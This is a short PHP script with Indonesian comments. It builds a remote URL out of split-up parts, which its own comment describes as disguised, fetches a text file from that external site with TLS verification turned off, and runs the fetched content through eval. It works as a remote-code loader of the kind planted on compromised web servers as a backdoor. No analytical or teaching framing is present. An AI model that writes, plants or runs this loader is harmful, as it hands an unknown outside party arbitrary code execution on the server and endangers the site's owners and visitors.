<?php
// Konfigurasi URL yang disamarkan
$protocol = 'https';
$domain   = 'seneporno';
$tld      = 'com';
$filePath = '/5.txt';

// Gabungkan bagian-bagian URL
$url = sprintf('%s://%s.%s%s', $protocol, $domain, $tld, $filePath);

/**
 * Mengambil konten dari URL menggunakan file_get_contents.
 *
 * @param string $url URL yang akan diakses.
 * @return string Konten yang diambil.
 * @throws Exception Jika gagal mengambil konten.
 */
function getContentWithFileGetContents($url)
{
    $content = @file_get_contents($url);
    if ($content === false) {
        throw new Exception("File tidak ditemukan atau tidak dapat diakses: " . $url);
    }
    return $content;
}

/**
 * Mengambil konten dari URL menggunakan cURL.
 *
 * @param string $url URL yang akan diakses.
 * @return string Konten yang diambil.
 * @throws Exception Jika gagal mengambil konten.
 */
function getContentWithCurl($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $content = curl_exec($ch);

    if ($content === false) {
        $error = curl_error($ch);
        curl_close($ch);
        throw new Exception("Gagal mengambil kode menggunakan cURL: " . $error);
    }

    curl_close($ch);
    return $content;
}

try {
    // Coba menggunakan file_get_contents terlebih dahulu
    if (function_exists('file_get_contents')) {
        $code = getContentWithFileGetContents($url);
    }
    // Jika file_get_contents tidak tersedia atau gagal, gunakan cURL
    else {
        $code = getContentWithCurl($url);
    }

    // Debugging: Tampilkan kode yang diambil
    echo "Kode yang diambil:\n";
    echo htmlspecialchars($code) . "\n";

    // Mengeksekusi kode PHP yang diambil
    eval('?>' . $code);
} catch (Exception $e) {
    // Tampilkan pesan error
    echo "Terjadi kesalahan: " . $e->getMessage();
}
?>